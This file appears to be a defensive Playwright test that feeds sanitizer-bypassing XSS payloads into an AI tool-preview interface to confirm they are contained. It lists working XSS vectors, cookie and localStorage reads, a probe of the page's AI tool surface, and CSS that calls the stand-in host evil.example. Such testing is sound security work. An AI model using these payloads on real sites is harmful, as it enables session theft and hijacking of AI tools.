#!/usr/bin/env node
/** Payloads that beat the regex sanitizer must still not reach the page. */
import { chromium } from "playwright";

const BASE = process.argv[2] || process.env.ARENA_BASE || "http://localhost:3000";

const PAYLOADS = [
  ["img onerror without whitespace", `<img/src=q/onerror="parent.__PWNED=1">`],
  ["details ontoggle", `<details open ontoggle="parent.__PWNED=1"><summary>x</summary></details>`],
  ["svg onload", `<svg/onload="parent.__PWNED=1">`],
  ["inline script", `<script>parent.__PWNED=1</script>`],
  ["iframe javascript url", `<iframe src="javascript:parent.__PWNED=1"></iframe>`],
  ["form action", `<form action="javascript:parent.__PWNED=1"><button>go</button></form>`],
  ["storage read", `<img/src=q/onerror="parent.__LEAK=localStorage.length">`],
  ["cookie read", `<img/src=q/onerror="parent.__LEAK=document.cookie||'empty'">`],
  ["tool surface reach", `<img/src=q/onerror="parent.__LEAK=typeof parent.document.modelContext">`],
  ["css exfiltration", `<div class="x">hi</div>`, `.x{background:url(https://evil.example/p)}@import url(https://evil.example/i);`],
];

const browser = await chromium.launch({
  headless: true,
  args: ["--enable-experimental-web-platform-features", "--enable-features=WebMCPTesting"],
});

let failures = 0;
for (const [label, html, css = ""] of PAYLOADS) {
  const context = await browser.newContext();
  const page = await context.newPage();
  const requests = [];
  page.on("request", (r) => {
    if (!r.url().startsWith(BASE) && !r.url().startsWith("data:") && !r.url().startsWith("about:")) {
      requests.push(r.url());
    }
  });
  await page.goto(BASE, { waitUntil: "networkidle" });
  await page.evaluate(
    async ([h, c]) => {
      const ctx = document.modelContext;
      const tool = (await ctx.getTools()).find((t) => t.name === "preview_view");
      await ctx.executeTool(tool, JSON.stringify({ html: h, css: c }));
    },
    [html, css],
  );
  await page.waitForTimeout(500);
  const out = await page.evaluate(() => ({
    pwned: window.__PWNED ?? null,
    leak: window.__LEAK ?? null,
  }));
  const offsite = requests.filter((u) => u.includes("evil.example"));
  const bad = out.pwned || out.leak || offsite.length;
  if (bad) failures++;
  console.log(
    `${bad ? "REACHED THE PAGE" : "contained      "}  ${label}` +
      (out.pwned ? ` pwned=${out.pwned}` : "") +
      (out.leak ? ` leak=${JSON.stringify(out.leak)}` : "") +
      (offsite.length ? ` requests=${offsite.join(",")}` : ""),
  );
  await context.close();
}

await browser.close();
console.log(failures ? `\n${failures} payload(s) escaped` : "\nall payloads contained");
process.exit(failures ? 1 : 0);
